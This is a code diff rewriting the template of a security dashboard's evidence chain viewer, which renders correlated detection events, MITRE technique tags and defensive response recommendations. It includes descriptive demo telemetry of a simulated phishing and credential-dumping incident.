+.perspective-fim { background: rgba(0,255,136,0.15); color: #00ff88; }
+.perspective-persistence { background: rgba(252,186,211,0.2); color: #FCBAD3; }
+.perspective-peripheral { background: rgba(255,107,157,0.2); color: #FF6B9D; }
+.perspective-kernel { background: rgba(255,217,61,0.2); color: #FFD93D; }
+.perspective-default { background: rgba(0,217,255,0.1); color: var(--neural-primary); }
 
-/* Evidence Timeline */
-.evidence-timeline-section {
-    margin-bottom: 4rem;
-}
-
-.timeline-container {
-    position: relative;
-    padding: 2rem 0;
-}
-
-.evidence-point {
-    display: grid;
-    grid-template-columns: 80px 1fr;
-    gap: 2rem;
-    margin-bottom: 3rem;
-}
-
-.evidence-marker {
-    position: relative;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-}
-
-.marker-icon {
-    width: 60px;
-    height: 60px;
-    background: rgba(0, 217, 255, 0.2);
-    border: 3px solid var(--neural-primary);
-    border-radius: 50%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 1.8rem;
-    z-index: 2;
-}
-
-.marker-line {
-    position: absolute;
-    top: 60px;
-    width: 3px;
-    height: calc(100% + 3rem);
-    background: linear-gradient(180deg, var(--neural-primary) 0%, rgba(0, 217, 255, 0.3) 100%);
-    z-index: 1;
-}
-
-.marker-line.final {
-    display: none;
-}
-
-/* Evidence Cards */
-.evidence-card {
-    background: rgba(10, 14, 39, 0.8);
-    border: 2px solid rgba(0, 217, 255, 0.3);
-    border-radius: 10px;
-    padding: 1.5rem;
-    transition: all 0.3s ease;
-}
-
-.evidence-card:hover {
-    border-color: var(--neural-primary);
-    box-shadow: 0 5px 25px rgba(0, 217, 255, 0.3);
-}
-
-.evidence-card-header {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    margin-bottom: 1rem;
-}
-
-.perspective-badge {
-    padding: 0.4rem 0.8rem;
-    border-radius: 5px;
-    font-size: 0.7rem;
-    font-weight: 800;
-    letter-spacing: 1px;
-}
-
-.perspective-badge.filesystem { background: rgba(139, 69, 19, 0.8); color: #daa520; }
-.perspective-badge.process { background: rgba(0, 136, 255, 0.3); color: #0088ff; }
-.perspective-badge.powershell { background: rgba(0, 119, 204, 0.3); color: #0077cc; }
-.perspective-badge.dns { background: rgba(128, 0, 128, 0.3); color: #9370db; }
-.perspective-badge.network { background: rgba(34, 139, 34, 0.3); color: #32cd32; }
-.perspective-badge.memory { background: rgba(255, 140, 0, 0.3); color: #ffa500; }
-.perspective-badge.registry { background: rgba(220, 20, 60, 0.3); color: #ff6347; }
-
-.timestamp {
-    color: var(--text-muted);
-    font-size: 0.85rem;
-    font-family: 'Courier New', monospace;
-}
-
-.evidence-title {
-    font-size: 1.2rem;
-    font-weight: 800;
-    color: var(--neural-primary);
-    margin-bottom: 1rem;
-}
-
-.evidence-details {
-    margin-bottom: 1rem;
-    padding: 1rem;
-    background: rgba(0, 0, 0, 0.3);
-    border-radius: 5px;
-}
-
-.detail-row {
-    display: grid;
-    grid-template-columns: 180px 1fr;
-    gap: 1rem;
-    margin-bottom: 0.75rem;
-}
-
-.detail-row:last-child {
-    margin-bottom: 0;
-}
-
-.detail-label {
-    color: var(--text-muted);
-    font-size: 0.85rem;
-    font-weight: 600;
-}
-
-.detail-value {
-    color: var(--text-primary);
-    font-size: 0.85rem;
-}
-
-.detail-value.code {
-    font-family: 'Courier New', monospace;
-    color: var(--neural-secondary);
-}
-
-.detail-value.threat {
-    color: var(--neural-danger);
-    font-weight: 700;
-}
-
-.code-block {
-    margin-top: 0.5rem;
-}
-
-.code-block pre {
-    background: rgba(0, 0, 0, 0.5);
-    padding: 1rem;
-    border-radius: 5px;
-    color: var(--neural-success);
-    font-size: 0.8rem;
-    overflow-x: auto;
-}
-
-.evidence-analysis {
-    padding: 1rem;
-    background: rgba(0, 217, 255, 0.05);
-    border-left: 3px solid var(--neural-primary);
-    border-radius: 5px;
-    margin-bottom: 1rem;
-    color: var(--text-secondary);
-    font-size: 0.9rem;
-    line-height: 1.6;
-}
-
-.correlation-link {
-    display: flex;
-    align-items: center;
-    gap: 0.75rem;
-    padding: 0.75rem;
-    background: rgba(0, 255, 136, 0.1);
-    border: 1px solid rgba(0, 255, 136, 0.3);
-    border-radius: 5px;
-    color: var(--neural-success);
-    font-size: 0.85rem;
-}
-
-.link-icon {
-    font-size: 1.2rem;
-}
-
-/* Correlation Graph */
-.correlation-graph-section {
-    margin-bottom: 4rem;
-}
-
-.graph-container {
-    background: rgba(10, 14, 39, 0.8);
-    border: 2px solid rgba(0, 217, 255, 0.3);
-    border-radius: 10px;
-    padding: 2rem;
-}
-
-.graph-legend {
-    display: flex;
-    justify-content: center;
-    gap: 2rem;
-    margin-bottom: 2rem;
-    flex-wrap: wrap;
-}
-
-.legend-item {
-    display: flex;
-    align-items: center;
-    gap: 0.5rem;
-    font-size: 0.85rem;
-    color: var(--text-secondary);
-}
-
-.legend-color {
-    width: 20px;
-    height: 20px;
-    border-radius: 3px;
-}
-
-.legend-color.filesystem { background: rgba(139, 69, 19, 0.8); }
-.legend-color.process { background: rgba(0, 136, 255, 0.8); }
-.legend-color.powershell { background: rgba(0, 119, 204, 0.8); }
-.legend-color.dns { background: rgba(128, 0, 128, 0.8); }
-.legend-color.network { background: rgba(34, 139, 34, 0.8); }
-.legend-color.memory { background: rgba(255, 140, 0, 0.8); }
-.legend-color.registry { background: rgba(220, 20, 60, 0.8); }
-
-.graph-placeholder {
-    min-height: 400px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-}
-
-/* Response Recommendations */
-.response-recommendations {
-    margin-bottom: 2rem;
-}
-
-.recommendations-grid {
-    display: grid;
-    grid-template-columns: repeat(3, 1fr);
-    gap: 1.5rem;
-}
-
-.recommendation-card {
-    background: rgba(10, 14, 39, 0.8);
-    border: 2px solid;
-    border-radius: 10px;
-    padding: 1.5rem;
-    transition: all 0.3s ease;
-}
-
-.recommendation-card.priority-critical {
-    border-color: var(--neural-danger);
-}
-
-.recommendation-card.priority-high {
-    border-color: var(--neural-warning);
-}
-
-.recommendation-card.priority-medium {
-    border-color: var(--neural-secondary);
-}
-
-.recommendation-card.priority-low {
-    border-color: rgba(0, 217, 255, 0.3);
-}
-
-.recommendation-card:hover {
-    transform: translateY(-3px);
-    box-shadow: 0 5px 20px rgba(0, 217, 255, 0.3);
-}
-
-.rec-header {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    margin-bottom: 1rem;
-}
-
-.rec-icon {
-    font-size: 2rem;
-}
-
-.rec-priority {
-    padding: 0.3rem 0.6rem;
-    border-radius: 3px;
-    font-size: 0.7rem;
-    font-weight: 800;
-    letter-spacing: 1px;
-}
-
-.priority-critical .rec-priority {
-    background: var(--neural-danger);
-    color: white;
-}
-
-.priority-high .rec-priority {
-    background: var(--neural-warning);
-    color: var(--bg-primary);
-}
-
-.priority-medium .rec-priority {
-    background: var(--neural-secondary);
-    color: var(--bg-primary);
-}
-
-.priority-low .rec-priority {
-    background: rgba(0, 217, 255, 0.3);
-    color: var(--neural-primary);
-}
-
-.recommendation-card h3 {
-    font-size: 1.1rem;
-    font-weight: 800;
-    color: var(--neural-primary);
-    margin-bottom: 0.75rem;
-}
-
-.recommendation-card p {
-    color: var(--text-secondary);
-    font-size: 0.9rem;
-    line-height: 1.5;
-    margin-bottom: 1rem;
-}
-
-.rec-action-button {
-    width: 100%;
-    background: rgba(0, 217, 255, 0.2);
-    border: 1px solid var(--neural-primary);
-    color: var(--neural-primary);
-    padding: 0.75rem;
-    border-radius: 5px;
-    font-size: 0.85rem;
-    font-weight: 700;
-    cursor: pointer;
-    transition: all 0.3s ease;
-}
-
-.rec-action-button:hover {
-    background: var(--neural-primary);
-    color: var(--bg-primary);
-}
-
-/* Responsive Design */
-@media (max-width: 1200px) {
-    .recommendations-grid {
-        grid-template-columns: repeat(2, 1fr);
-    }
-}
-
-@media (max-width: 768px) {
-    .evidence-header {
-        flex-direction: column;
-        align-items: flex-start;
-    }
-
-    .header-actions {
-        margin-top: 1rem;
-        flex-direction: column;
-        width: 100%;
-    }
-
-    .action-button {
-        width: 100%;
-    }
-
-    .evidence-point {
-        grid-template-columns: 60px 1fr;
-        gap: 1rem;
-    }
-
-    .detail-row {
-        grid-template-columns: 1fr;
-    }
-
-    .recommendations-grid {
-        grid-template-columns: 1fr;
-    }
+/* ── Responsive ── */
+@media (max-width: 900px) {
+    .ec-header { flex-direction: column; align-items: stretch; }
+    .ec-recs { grid-template-columns: 1fr; }
+    .ec-detail-row { grid-template-columns: 1fr; }
 }
 </style>
 
 <script nonce="{{ csp_nonce() }}">
-class EvidenceChain {
+class EvidenceChainViewer {
     constructor() {
+        this.seedEvent = null;
+        this.correlatedEvents = [];
+        this.phases = [];
+        this.mitreChain = [];
         this.init();
     }
 
-    init() {
-        console.log('Evidence Chain Viewer initialized with synthetic PowerShell attack data');
+    async init() {
+        const params = new URLSearchParams(window.location.search);
+        const eventId = params.get('event_id');
+
+        if (eventId) {
+            await this.loadFromAPI(eventId);
+        } else {
+            this.loadDemo();
+        }
     }
 
-    loadSampleAttack(attackType) {
-        alert(`LOADING SAMPLE ATTACK: ${attackType.toUpperCase()}\n\nThis evidence chain viewer shows a complete PowerShell-based credential theft attack.\n\nIn production, you could load different attack scenarios:\n- Ransomware deployment\n- Lateral movement\n- Data exfiltration\n- Supply chain compromise`);
+    async loadFromAPI(eventId) {
+        const msg = document.getElementById('loading-msg');
+        msg.textContent = 'Loading evidence chain for event #' + eventId + '...';
+
+        try {
+            const r = await fetch('/dashboard/api/correlate?event_id=' + eventId + '&window_minutes=60');
+            if (!r.ok) throw new Error('HTTP ' + r.status);
+            const d = await r.json();
+            if (d.status !== 'success') throw new Error(d.message || 'API error');
+
+            this.seedEvent = d.seed_event;
+            this.correlatedEvents = d.correlated_events || [];
+            this.phases = d.phases || [];
+            this.mitreChain = d.mitre_chain || [];
+
+            this.renderSummary();
+            this.renderTimeline();
+            this.renderCorrelation(d);
+            this.renderRecommendations();
+        } catch (e) {
+            msg.textContent = 'Failed: ' + e.message + '. Click "Load Demo" to see sample data.';
+        }
+    }
+
+    loadDemo() {
+        // Demo seed event
+        this.seedEvent = {
+            id: 0, event_category: 'lolbin_execution', risk_score: 0.85,
+            description: 'PowerShell spawned from Word document with encoded command — classic spearphishing execution chain',
+            timestamp_dt: '2025-01-15T14:23:45', device_id: 'WS-4892',
+            final_classification: 'malicious',
+            mitre_techniques: ['T1566.001', 'T1059.001', 'T1071.001', 'T1003.001'],
+            indicators: { source_ip: '10.0.2.15', agent: 'ProcAgent', exe: 'powershell.exe', parent: 'WINWORD.EXE' },
+        };
+
+        this.correlatedEvents = [
+            { id: 1, event_category: 'critical_file_tampered', risk_score: 0.6, description: 'Suspicious document downloaded: Invoice_2025.docx', timestamp_dt: '2025-01-15T14:23:12', device_id: 'WS-4892', mitre_techniques: ['T1566.001'], indicators: { agent: 'FIM', file_path: '/Users/jdoe/Downloads/Invoice_2025.docx' }, correlation_score: 5 },
+            { id: 2, event_category: 'dns_query', risk_score: 0.7, description: 'DNS lookup for known C2 domain', timestamp_dt: '2025-01-15T14:23:47', device_id: 'WS-4892', mitre_techniques: ['T1071.001'], indicators: { agent: 'DNS', domain: 'malicious-c2.example.com', resolved_ip: '45.33.32.156' }, correlation_score: 4 },
+            { id: 3, event_category: 'flow_c2', risk_score: 0.8, description: 'C2 connection established — HTTPS with certificate mismatch', timestamp_dt: '2025-01-15T14:23:48', device_id: 'WS-4892', mitre_techniques: ['T1071.001'], indicators: { agent: 'FlowAgent', dst_ip: '45.33.32.156', bytes_tx: '47KB', bytes_rx: '2.3MB' }, correlation_score: 4 },
+            { id: 4, event_category: 'process_wrong_user', risk_score: 0.9, description: 'LSASS memory access from PowerShell — credential dumping attempt', timestamp_dt: '2025-01-15T14:24:15', device_id: 'WS-4892', mitre_techniques: ['T1003.001'], indicators: { agent: 'KernelAudit', target_process: 'lsass.exe', access_rights: 'PROCESS_VM_READ' }, correlation_score: 5 },
+            { id: 5, event_category: 'persistence_shell_profile', risk_score: 0.75, description: 'Run key modified for persistence — WindowsUpdate entry added', timestamp_dt: '2025-01-15T14:24:32', device_id: 'WS-4892', mitre_techniques: ['T1547.001'], indicators: { agent: 'PersistenceGuard', key: 'HKCU\\...\\Run\\WindowsUpdate' }, correlation_score: 3 },
+        ];
+
+        this.mitreChain = ['T1566.001', 'T1059.001', 'T1071.001', 'T1003.001', 'T1547.001'];
+        this.phases = [];
+
+        this.renderSummary();
+        this.renderTimeline();
+        this.renderCorrelation({ total_correlated: this.correlatedEvents.length, timeline_span_seconds: 80 });
+        this.renderRecommendations();
+    }
+
+    renderSummary() {
+        const card = document.getElementById('threat-summary');
+        const seed = this.seedEvent;
+        const sev = this.riskToSeverity(seed.risk_score || 0);
+        card.className = 'ec-summary-card threat-' + sev;
+
+        const mitre = seed.mitre_techniques || [];
+        const indicators = seed.indicators || {};
+        const total = this.correlatedEvents.length + 1;
+
+        card.innerHTML =
+            '<div class="ec-summary-header">' +
+                '<div>' +
+                    '<div class="ec-sev-badge sev-' + sev + '">' + sev.toUpperCase() + '</div>' +
+                    '<div class="ec-threat-title">' + this.fmtType(seed.event_category) + '</div>' +
+                    '<div class="ec-threat-meta">' +
+                        '<span><strong>Detected:</strong> ' + (seed.timestamp_dt || '--') + '</span>' +
+                        '<span><strong>Risk:</strong> ' + ((seed.risk_score || 0) * 100).toFixed(0) + '%</span>' +
+                        '<span><strong>Evidence Points:</strong> ' + total + '</span>' +
+                        '<span><strong>Device:</strong> ' + this.esc(seed.device_id || '--') + '</span>' +
+                    '</div>' +
+                '</div>' +
+            '</div>' +
+            (mitre.length > 0 ?
+                '<div class="ec-mitre"><h4>MITRE ATT&CK Techniques</h4>' +
+                '<div class="ec-mitre-tags">' + mitre.map(t => '<span class="ec-mitre-tag">' + t + '</span>').join('') + '</div></div>' : '') +
+            '<div class="ec-narrative"><h4>Threat Narrative</h4>' +
+                '<p>' + this.esc(seed.description || 'No description available.') + '</p>' +
+            '</div>';
+    }
+
+    renderTimeline() {
+        const section = document.getElementById('timeline-section');
+        const container = document.getElementById('evidence-timeline');
+        section.style.display = 'block';
+
+        const allEvents = [this.seedEvent, ...this.correlatedEvents];
+        allEvents.sort((a, b) => (a.timestamp_dt || '').localeCompare(b.timestamp_dt || ''));
+
+        container.innerHTML = allEvents.map((e, i) => {
+            const sev = this.riskToSeverity(e.risk_score || 0);
+            const indicators = e.indicators || {};
+            const agent = indicators.agent || e.device_id || 'System';
+            const perspectiveClass = this.getPerspectiveClass(agent);
+            const mitre = e.mitre_techniques || [];
+            const isSeed = e.id === this.seedEvent.id;
+
+            // Build detail rows from indicators
+            let detailRows = '';
+            for (const [k, v] of Object.entries(indicators)) {
+                if (k === 'agent' || !v) continue;
+                detailRows += '<div class="ec-detail-row"><span class="ec-detail-label">' + this.fmtType(k) + ':</span><span class="ec-detail-value">' + this.esc(String(v)) + '</span></div>';
+            }
+
+            return '<div class="ec-evidence sev-' + sev + '">' +
+                '<div class="ec-ev-header">' +
+                    '<div class="ec-ev-perspective ' + perspectiveClass + '">' + this.esc(agent) + '</div>' +
+                    '<div class="ec-ev-time">' + this.esc(e.timestamp_dt || '--') + '</div>' +
+                '</div>' +
+                '<div class="ec-ev-title">' + (isSeed ? '&#9733; ' : '') + this.fmtType(e.event_category) + '</div>' +
+                '<div class="ec-ev-desc">' + this.esc(e.description || '') + '</div>' +
+                (detailRows ? '<div class="ec-ev-details">' + detailRows + '</div>' : '') +
+                (mitre.length > 0 ?
+                    '<div class="ec-ev-analysis"><strong>MITRE:</strong> ' + mitre.join(', ') + '</div>' : '') +
+                (e.correlation_score ?
+                    '<div class="ec-ev-correlation">&#128279; Correlation score: ' + e.correlation_score + ' — ' + this.correlationLabel(e.correlation_score) + '</div>' : '') +
+            '</div>';
+        }).join('');
+    }
+
+    renderCorrelation(apiData) {
+        const section = document.getElementById('correlation-section');
+        const container = document.getElementById('correlation-graph');
+        section.style.display = 'block';
+
+        const total = (apiData.total_correlated || 0) + 1;
+        const span = apiData.timeline_span_seconds || 0;
+        const spanStr = span > 3600 ? (span / 3600).toFixed(1) + 'h' : span > 60 ? Math.floor(span / 60) + 'm' : Math.floor(span) + 's';
+        const agents = new Set();
+        [this.seedEvent, ...this.correlatedEvents].forEach(e => {
+            const a = (e.indicators || {}).agent || e.device_id || '';
+            if (a) agents.add(a);
+        });
+
+        container.innerHTML =
+            '<div class="ec-corr-stats">' +
+                '<div class="ec-corr-stat"><div class="ec-corr-stat-val">' + total + '</div><div class="ec-corr-stat-lbl">Evidence Points</div></div>' +
+                '<div class="ec-corr-stat"><div class="ec-corr-stat-val">' + this.mitreChain.length + '</div><div class="ec-corr-stat-lbl">MITRE Techniques</div></div>' +
+                '<div class="ec-corr-stat"><div class="ec-corr-stat-val">' + agents.size + '</div><div class="ec-corr-stat-lbl">Agent Perspectives</div></div>' +
+                '<div class="ec-corr-stat"><div class="ec-corr-stat-val">' + spanStr + '</div><div class="ec-corr-stat-lbl">Timeline Span</div></div>' +
+                '<div class="ec-corr-stat"><div class="ec-corr-stat-val">' + this.phases.length + '</div><div class="ec-corr-stat-lbl">Attack Phases</div></div>' +
+            '</div>';
+    }
+
+    renderRecommendations() {
+        const section = document.getElementById('recommendations-section');
+        const container = document.getElementById('recommendations');
+        section.style.display = 'block';
+
+        const seed = this.seedEvent;
+        const sev = this.riskToSeverity(seed.risk_score || 0);
+        const seedIndicators = seed.indicators || {};
+
+        const recs = [];
+        if (sev === 'critical' || sev === 'high') {
+            recs.push({ icon: '&#128680;', priority: 'critical', title: 'Isolate Affected Endpoint', desc: 'Disconnect ' + this.esc(seed.device_id || 'endpoint') + ' from network to prevent lateral movement' });
+        }
+        if (seedIndicators.exe || seedIndicators.pid) {
+            recs.push({ icon: '&#128274;', priority: 'high', title: 'Terminate Malicious Process', desc: 'Kill ' + this.esc(seedIndicators.exe || 'process') + ' and child processes' });
+        }
+        if (seed.mitre_techniques && seed.mitre_techniques.some(t => t.startsWith('T1003'))) {
+            recs.push({ icon: '&#128273;', priority: 'high', title: 'Reset Credentials', desc: 'Force password reset for affected accounts — credentials likely compromised' });
+        }
+        recs.push({ icon: '&#128269;', priority: 'medium', title: 'Hunt for Indicators', desc: 'Search for correlated indicators across other endpoints in the environment' });
+        recs.push({ icon: '&#128200;', priority: 'medium', title: 'Review Timeline', desc: 'Open <a href="/dashboard/timeline-replay?event_id=' + (seed.id || '') + '" style="color:var(--neural-primary);">Timeline Replay</a> for step-by-step analysis' });
+
+        container.innerHTML = recs.map(r =>
+            '<div class="ec-rec priority-' + r.priority + '">' +
+                '<div class="ec-rec-header"><span class="ec-rec-icon">' + r.icon + '</span><span class="ec-rec-priority">' + r.priority.toUpperCase() + '</span></div>' +
+                '<h4>' + r.title + '</h4>' +
+                '<p>' + r.desc + '</p>' +
+            '</div>'
+        ).join('');
     }
 
     exportChain() {
-        alert('EXPORT EVIDENCE CHAIN\n\nIn production, this would export:\n- Complete evidence timeline (JSON/PDF)\n- All correlation metadata\n- MITRE ATT&CK mapping\n- Response recommendations\n- Forensic artifact bundle');
+        const allEvents = [this.seedEvent, ...this.correlatedEvents];
+        if (allEvents.length === 0 || !this.seedEvent) { alert('No evidence chain loaded'); return; }
+
+        const data = {
+            seed_event: this.seedEvent,
+            correlated_events: this.correlatedEvents,
+            mitre_chain: this.mitreChain,
+            exported_at: new Date().toISOString(),
+        };
+        const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = 'evidence_chain_' + (this.seedEvent.id || 'demo') + '_' + new Date().toISOString().slice(0, 10) + '.json';
+        a.style.display = 'none';
+        document.body.appendChild(a); a.click();
+        document.body.removeChild(a); URL.revokeObjectURL(url);
+    }
+
+    /* ── Helpers ── */
+    riskToSeverity(score) {
+        if (score >= 0.75) return 'critical';
+        if (score >= 0.5) return 'high';
+        if (score >= 0.25) return 'medium';
+        return 'low';
+    }
+
+    fmtType(t) { return (t || 'unknown').replace(/_/g, ' ').replace(/\b\w/g, c => c.toUpperCase()); }
+    esc(s) { const d = document.createElement('div'); d.textContent = s || ''; return d.innerHTML; }
+
+    getPerspectiveClass(agent) {
+        const a = (agent || '').toLowerCase();
+        if (a.includes('proc')) return 'ec-ev-perspective perspective-proc';
+        if (a.includes('flow')) return 'ec-ev-perspective perspective-flow';
+        if (a.includes('dns')) return 'ec-ev-perspective perspective-dns';
+        if (a.includes('auth')) return 'ec-ev-perspective perspective-auth';
+        if (a.includes('fim')) return 'ec-ev-perspective perspective-fim';
+        if (a.includes('persist')) return 'ec-ev-perspective perspective-persistence';
+        if (a.includes('periph')) return 'ec-ev-perspective perspective-peripheral';
+        if (a.includes('kernel')) return 'ec-ev-perspective perspective-kernel';
+        return 'ec-ev-perspective perspective-default';
+    }
+
+    correlationLabel(score) {
+        if (score >= 5) return 'Strong correlation';
+        if (score >= 3) return 'Moderate correlation';
+        return 'Weak correlation';
     }
 }
 
-// Initialize Evidence Chain Viewer
-let evidenceChain;
-document.addEventListener('DOMContentLoaded', () => {
-    evidenceChain = new EvidenceChain();
-});
+let chain;
+document.addEventListener('DOMContentLoaded', () => { chain = new EvidenceChainViewer(); });
 </script>
 {% endblock %}
